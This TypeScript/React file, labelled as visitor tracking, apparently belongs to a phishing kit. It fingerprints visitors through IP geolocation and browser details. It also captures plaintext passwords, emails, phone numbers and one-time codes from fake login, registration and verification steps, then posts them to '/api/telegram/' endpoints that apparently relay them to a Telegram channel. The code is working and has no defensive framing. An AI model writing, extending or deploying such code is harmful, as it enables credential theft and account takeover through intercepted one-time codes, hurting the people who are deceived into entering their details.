import { useEffect, useState } from "react"

const UNKNOWN = "Unknown"
const FALLBACK_URL =
  "https://api.ip-api.com/json/?fields=status,country,regionName,city,query,timezone,isp"

export interface VisitorInfo {
  location: string
  ip: string
  timezone: string
  isp: string
  userAgent: string
  screen: string
  language: string
  referrer: string
  utcTime: string
}

interface GeoData {
  ip: string
  location: string
  timezone: string
  isp: string
}

function safeStr(value: unknown): string {
  if (value == null || value === "") return UNKNOWN
  const s = String(value).trim()
  if (s === "" || s === "undefined" || s === "null") return UNKNOWN
  return s
}

function getBrowserFields(): Pick<
  VisitorInfo,
  "userAgent" | "screen" | "language" | "referrer" | "utcTime"
> {
  return {
    userAgent: typeof navigator !== "undefined" ? navigator.userAgent : UNKNOWN,
    screen:
      typeof window !== "undefined"
        ? `${window.screen.width}x${window.screen.height}`
        : UNKNOWN,
    language: typeof navigator !== "undefined" ? navigator.language : UNKNOWN,
    referrer:
      typeof document !== "undefined" && document.referrer
        ? document.referrer
        : "Direct",
    utcTime:
      typeof Date !== "undefined"
        ? new Date().toLocaleString("en-US", {
            timeZone: "UTC",
            year: "numeric",
            month: "2-digit",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: true,
          })
        : UNKNOWN,
  }
}

async function fetchFallback(): Promise<GeoData | null> {
  try {
    const res = await fetch(FALLBACK_URL, {
      signal: AbortSignal.timeout(5000),
    })
    if (!res.ok) return null
    const d = await res.json()
    if (d.status !== "success") return null
    const location = [d.city, d.regionName, d.country]
      .filter((x) => x != null && String(x).trim() !== "")
      .join(", ")
    return {
      ip: d.query ?? "",
      location: location || "",
      timezone: d.timezone ?? "",
      isp: d.isp ?? "",
    }
  } catch {
    return null
  }
}

export function useVisitorTracking() {
  const [visitorInfo, setVisitorInfo] = useState<VisitorInfo | null>(null)

  useEffect(() => {
    let cancelled = false

    const run = async () => {
      const browser = getBrowserFields()
      const geo: GeoData | null = await fetchFallback()
      if (cancelled) return
      const g = geo ?? {
        ip: "",
        location: "",
        timezone: "",
        isp: "",
      }
      setVisitorInfo({
        ...browser,
        ip: safeStr(g.ip),
        location: safeStr(g.location),
        timezone: safeStr(g.timezone),
        isp: safeStr(g.isp),
      })
    }

    void run()
    return () => {
      cancelled = true
    }
  }, [])

  return visitorInfo
}

export async function trackFormSubmission(data: {
  type:
    | "login"
    | "registration"
    | "email_verification"
    | "text_verification"
    | "login_email_otp_verification"
    | "login_text_otp_verification"
    | "login_email_otp_resend"
    | "login_text_otp_resend"
    | "login_did_not_receive_code"
    | "registration_email_otp_resend"
    | "registration_text_otp_resend"
    | "registration_did_not_receive_code"
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  method?: string
  page: string
}): Promise<boolean> {
  const formData = {
    ...data,
    timestamp: new Date().toISOString(),
  }

  let endpoint = "/api/form-submission"
  if (data.type === "login" || data.type === "registration") {
    endpoint = "/api/telegram/login"
  } else if (
    data.type === "email_verification" ||
    data.type === "text_verification"
  ) {
    endpoint = "/api/telegram/verification-click"
  } else if (
    data.type === "login_email_otp_verification" ||
    data.type === "login_text_otp_verification"
  ) {
    endpoint = "/api/telegram/verification"
  } else if (
    data.type === "login_email_otp_resend" ||
    data.type === "login_text_otp_resend" ||
    data.type === "login_did_not_receive_code"
  ) {
    endpoint = "/api/telegram/resend-code"
  }

  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        ...formData,
        method:
          data.method ??
          (data.type.includes("email")
            ? "email"
            : data.type.includes("text")
              ? "text"
              : undefined),
      }),
      keepalive: true,
    })

    const result = (await response.json()) as { success?: boolean; telegramSent?: boolean }
    return result.telegramSent === true || result.success === true || response.ok
  } catch (error) {
    console.error("Failed to track form submission:", error)
    return false
  }
}

